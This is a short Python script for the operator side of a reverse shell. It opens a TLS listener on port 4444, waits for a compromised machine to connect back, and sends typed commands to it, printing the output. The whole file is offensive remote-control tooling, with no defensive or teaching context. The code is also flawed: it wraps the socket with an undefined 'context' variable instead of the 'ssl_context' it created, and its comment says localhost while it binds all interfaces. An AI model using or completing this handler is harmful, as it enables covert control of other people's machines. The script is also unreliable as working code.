import socket
import ssl


ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ssl_context.load_cert_chain(
    certfile="/home/you/.reverse_shell_certs/cert.pem",
    keyfile="/home/you/.reverse_shell_certs/key.pem"
)

# create the listener, bind it to localhost on port 4444, and listen for incoming connections
listener = socket.socket()
listener.bind(("0.0.0.0", 4444))
listener.listen(1)
print("[*] Waiting for connection...")

# accept the connection
conn, addr = listener.accept()
print(f"[*] Connection from {addr} has been established.")

# wrap the connection in SSL
tls_conn = context.wrap_socket(conn, server_side=True)
print(f"[+] Secure connection from {addr}")

try:
    while True:
        command = input("Shell> ").strip()
        if not command:
            continue

        if command.lower() == "exit":
            tls_conn.sendall(b"exit")
            break

        tls_conn.sendall(command.encode())
        result = tls_conn.recv(4096).decode(errors='ignore')
        print(result)
except Exception as e:
    print(f"[!] Error: {e}")
finally:
    tls_conn.close()
    listener.close()